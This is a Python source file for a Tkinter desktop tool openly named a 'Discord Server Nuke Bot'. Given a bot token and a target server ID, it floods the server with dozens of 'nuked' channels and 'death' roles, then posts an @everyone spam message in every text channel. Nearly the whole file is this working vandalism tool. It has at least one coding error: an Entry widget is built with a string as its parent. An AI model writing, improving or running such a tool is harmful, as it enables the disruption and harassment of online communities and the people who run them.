import tkinter as tk
from tkinter import messagebox, filedialog
import discord
import asyncio
import threading
import random
import string

class DiscordServerNukeBot:
    def __init__(self, master):
        self.master = master
        master.title("Discord Server Nuke Bot")
        master.geometry("700x900")

        # Token Input
        tk.Label(master, text="Bot Token:").pack(pady=5)
        self.token_entry = tk.Entry(master, width=50, show="*")
        self.token_entry.pack(pady=5)

        # Buttons
        tk.Button(master, text="Start Bot", command=self.start_bot).pack(pady=5)
        tk.Button(master, text="Nuke Server", command=self.nuke_server).pack(pady=5)

        # Server Details
        tk.Label(master, text="Target Server Details", font=('Arial', 12, 'bold')).pack(pady=10)
        self.server_id_entry = tk.Entry("xxxxxxxxxxxxxx")  # Pre-filled server ID
        self.server_id_entry.pack(pady=5)

        # Nuke Configuration
        tk.Label(master, text="Nuke Configuration", font=('Arial', 12, 'bold')).pack(pady=10)
        
        # Channel Creation
        tk.Label(master, text="Channels to Create:").pack()
        self.channels_entry = tk.Entry(master, width=10)
        self.channels_entry.insert(0, "50")  # Default 50 channels
        self.channels_entry.pack()

        # Role Creation
        tk.Label(master, text="Random Roles to Create:").pack()
        self.roles_entry = tk.Entry(master, width=10)
        self.roles_entry.insert(0, "100")  # 100 random roles
        self.roles_entry.pack()

        # Message Configuration
        tk.Label(master, text="Spam Message:").pack()
        self.message_text = tk.Text(master, height=3, width=50)
        self.message_text.insert(tk.END, "@everyone 💀🔥 **BEST NUKE BOT**")
        self.message_text.pack()

        # Log Area
        self.log_text = tk.Text(master, height=15, width=70)
        self.log_text.pack(pady=10)

        # Initialize Discord client
        self.client = None
        self.bot_token = None
        self.event_loop = None

    def log(self, message):
        self.log_text.insert(tk.END, f"{message}\n")
        self.log_text.see(tk.END)

    def generate_random_string(self, length=8):
        """Generate a random string for role names"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def start_bot(self):
        self.bot_token = self.token_entry.get().strip()
        if not self.bot_token:
            messagebox.showerror("Error", "Please enter bot token")
            return

        # Create a new event loop for this thread
        self.event_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.event_loop)

        intents = discord.Intents.all()
        self.client = discord.Client(intents=intents)

        @self.client.event
        async def on_ready():
            print(f"Bot logged in as {self.client.user}")

            self.log(f"Bot connected as {self.client.user}")

        def run_bot():
            try:
                self.event_loop.run_until_complete(self.client.start(self.bot_token))
            except Exception as e:
                print(f"Bot start error: {e}")

        threading.Thread(target=run_bot, daemon=True).start()

    def nuke_server(self):
        if not self.client or not self.client.is_ready():
            self.log("Bot is not connected!")
            return

        server_id = int(self.server_id_entry.get())
        guild = self.client.get_guild(server_id)

        if not guild:
            self.log("Server not found!")
            return

        # Nuke Configuration
        num_channels = int(self.channels_entry.get())
        num_roles = int(self.roles_entry.get())
        spam_message = self.message_text.get("1.0", tk.END).strip()

        async def nuke_actions():
            try:
                # Create Channels
                for i in range(num_channels):
                    channel_name = f"nuked-{i+1}"
                    await guild.create_text_channel(channel_name)
                self.log(f"Created {num_channels} channels")

                # Create Random Roles
                for _ in range(num_roles):
                    role_name = f"death-{self.generate_random_string()}"
                    color = discord.Color(random.randint(0, 0xFFFFFF))
                    await guild.create_role(name=role_name, color=color)
                self.log(f"Created {num_roles} random roles")

                # Spam Messages
                channels = guild.text_channels
                for channel in channels:
                    try:
                        await channel.send(spam_message)
                    except:
                        pass
                self.log(f"Spammed messages in {len(channels)} channels")

                self.log("Server Nuke Complete! 💀🔥")

            except Exception as e:
                self.log(f"Nuke Failed: {e}")

        # Use run_coroutine_threadsafe to run the coroutine
        asyncio.run_coroutine_threadsafe(nuke_actions(), self.event_loop)

def main():
    root = tk.Tk()
    app = DiscordServerNukeBot(root)
    root.mainloop()

if __name__ == "__main__":
    main()
